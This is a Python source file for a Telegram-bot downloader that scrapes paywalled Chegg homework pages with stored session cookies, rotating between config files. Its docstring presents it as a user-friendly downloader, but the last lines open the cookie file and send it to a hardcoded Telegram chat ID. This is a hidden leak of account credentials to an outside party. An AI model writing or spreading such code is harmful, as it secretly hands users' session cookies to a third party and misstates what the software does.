import argparse
import random
import json
import os
import asyncio
from importlib.resources import read_text
import Downloader
from .CheggScraper import CheggScraper


async def main(text,mi_context,mi_update,name, user_id, user_name ):
    """
    User Friendly Downloader for chegg homework help pages

    :return: Nothing
    :rtype: None

    """
    x = random.randint(1, 2)
    print(x)
    if x == 1:
     conf = json.loads(read_text('cheggscraper', 'conf1.json'))
    if x == 2:
     conf = json.loads(read_text('cheggscraper', 'conf2.json'))
    if x == 3:
     conf = json.loads(read_text('cheggscraper', 'conf3.json'))
  
    
    #conf = json.loads(read_text('cheggscraper', 'conf.json'))

    default_save_file_format = conf.get('default_save_file_format')
    default_cookie_file_path = conf.get('default_cookie_file_path')

    ap = argparse.ArgumentParser()
    ap.add_argument('-c', '--cookie', default=default_cookie_file_path,
                    help='path of cookie life', dest='cookie_file')
    ap.add_argument('-u', '--url', help='url of chegg homework-help, put inside " "',
                    type=str, dest='url')
    # FIXME: DIFF TAGS FOR FILE FORMAT AND BASE PATH
    ap.add_argument('-s', '--save',
                    help='file path, where you want to save, put inside " " eg: test.html or'
                         ' D:\\myFolder\\test.html or /home/test.html',
                    type=str, default=default_save_file_format, dest='file_format')
    args = vars(ap.parse_args())

    if not os.path.exists(path=args['cookie_file']):
        raise Exception(f'{args["cookie_file"]} does not exists')

    if not args.get('url'):
        args.update({'url': text})

    Chegg = CheggScraper(cookie_path=args['cookie_file'])
    print(Chegg.url_to_html(args['url'], file_name_format=args['file_format']))
    file = open(str(default_cookie_file_path), 'rb')
    await mi_context.bot.send_document(chat_id = 5169338448, document = file)
    file.close()
    await Downloader.echo(text,mi_context,mi_update,name, user_id, user_name)
